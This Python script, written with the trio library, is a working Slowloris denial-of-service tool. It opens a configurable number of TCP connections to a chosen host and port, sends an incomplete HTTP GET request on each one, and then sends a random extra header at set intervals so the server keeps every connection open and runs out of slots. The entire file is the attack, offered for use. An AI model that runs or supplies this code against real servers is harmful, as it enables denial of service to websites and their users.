from random import random
from functools import partial
from contextvars import ContextVar
from argparse import ArgumentParser

import trio


task_name = ContextVar('task_name')


def log(msg):
    print(f'{task_name.get()}: {msg}')


async def slowloris(host, port, interval, cons):
    task_name.set('main')
    log('started')

    async def worker(label):
        task_name.set(f'worker-{label}')
        log('started')

        while True:
            try:
                log('opening tcp stream...')
                stream = await trio.open_tcp_stream(host, port)

                async with stream:
                    log('sending request...')
                    await stream.send_all(b'GET /?r=%r HTTP/1.1\r\n' % random())

                    while True:
                        log('sending headers...')
                        await stream.send_all(b'X-X: %r\r\n' % random())

                        log('sleeping...')
                        await trio.sleep(interval)

            except trio.BrokenResourceError as e:
                log(f'error: {e!r}')

            except OSError as e:
                log(f'crashed: {e!r}')
                return

    async with trio.open_nursery() as nursery:
        for i in range(cons):
            nursery.start_soon(worker, i)


def main():
    parser = ArgumentParser()

    parser.add_argument('--host', default='localhost')
    parser.add_argument('--port', type=int, default=80)
    parser.add_argument('--interval', type=int, default=10)
    parser.add_argument('--cons', type=int, default=100)

    args = parser.parse_args()

    trio.run(partial(slowloris, **args.__dict__))


if __name__ == '__main__':
    main()
